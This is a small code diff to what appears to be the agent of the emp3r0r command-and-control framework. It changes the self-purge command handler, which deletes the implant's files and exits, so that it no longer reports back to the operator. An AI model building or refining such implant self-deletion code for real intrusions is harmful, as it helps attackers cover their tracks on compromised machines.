@@ -203,12 +203,10 @@ func processCCData(data *emp3r0r_def.MsgTunData) {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
 			break
 		}
-		out = fmt.Sprintf("Agent %s is self purging...", RuntimeConfig.AgentTag)
 		err = os.RemoveAll(RuntimeConfig.AgentRoot)
 		if err != nil {
-			out = "Failed to cleanup files"
+			log.Println("Failed to cleanup files")
 		}
-		sendResponse(out)
 		log.Println("Exiting...")
 		os.Exit(0)
 	case "ls":
